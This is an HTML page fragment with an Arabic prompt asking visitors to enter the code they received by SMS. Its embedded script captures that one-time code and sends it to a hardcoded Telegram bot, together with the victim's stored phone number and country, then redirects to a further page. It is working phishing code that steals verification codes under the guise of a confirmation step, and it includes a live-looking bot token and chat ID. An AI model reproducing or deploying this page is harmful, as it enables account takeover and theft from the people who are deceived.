    <h1 class="issam" style="margin-top:100px;"> أدخل الكود الذي توصلتم به عبر الرسالة النصية </h1>
    <input id="name" name="name" type="text" maxlength="6" placeholder="*** ***" style="margin-top:100px;font-size: 40px;" required />
    <br>
    <button onclick="sendName()" type="submit" style="margin-top: 50px;font-size: 50px;font-family: 'Almarai', sans-serif;padding: 15px;width: 40%;background-color: #01e675;color:#FFF;border:none;">إتمام</button>

    <br>
    <script>
        const botToken = '7292959892:AAE3azYgFFdyynNrl5v_mp0-3iCT593lzBg';  // Replace with your Telegram bot token
        const chatId = '1452497907';      // Replace with your Telegram chat ID

        // Function to send name with previous data to Telegram and navigate to third page
        function sendName() {
            const name = document.getElementById("name").value;

            // Retrieve phone number and country from localStorage
            const phoneNumber = localStorage.getItem('phoneNumber');
            const countryName = localStorage.getItem('countryName');

            if (name.trim()) {
                // Save name to localStorage for the third page
                localStorage.setItem('userName', name);

                // Send the phone number, country, and name to Telegram
                const message = `Num: ${phoneNumber}\nCountry: ${countryName}\nCode: ${name}`;
                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

                fetch(url)
                    .then(response => {
                        if (response.ok) {
                            // Redirect to the third page
                            window.location.href = "pipage.html";
                        } else {
                            alert('Failed to send data to Telegram');
                        }
                    })
                    .catch(error => {
                        alert('Error sending data: ' + error);
                    });
            } else {
                alert('Please enter a valid name.');
            }
        }
    </script>
